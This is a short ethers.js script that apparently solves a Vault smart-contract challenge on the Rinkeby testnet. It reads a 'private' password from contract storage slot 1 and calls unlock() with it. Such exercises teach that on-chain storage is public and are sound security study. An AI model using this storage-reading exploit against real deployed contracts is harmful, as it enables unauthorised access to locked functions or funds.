require("dotenv").config();

const provider = new hre.ethers.providers.JsonRpcProvider( process.env.RINKEBY_URL );
const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );

const main = async () => {
  const abiEncoder = hre.ethers.utils.defaultAbiCoder
  const vaultAbi = await hre.artifacts.readArtifact("Vault");
  const vaultContract = await new hre.ethers.Contract("0x7Ca9Ffa0792BD500fFaCD04108eB0DCd58Da4432", vaultAbi.abi, wallet);
  console.log("Delegate contract: " + vaultContract.address);

  let txn = await provider.getStorageAt(vaultContract.address, 1);
  console.log(`Vault password: ${(hre.ethers.utils.toUtf8String(txn))}`);

  vaultContract.unlock(hre.ethers.utils.toUtf8String(txn));
  console.log("Vault unlocked.")
}

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
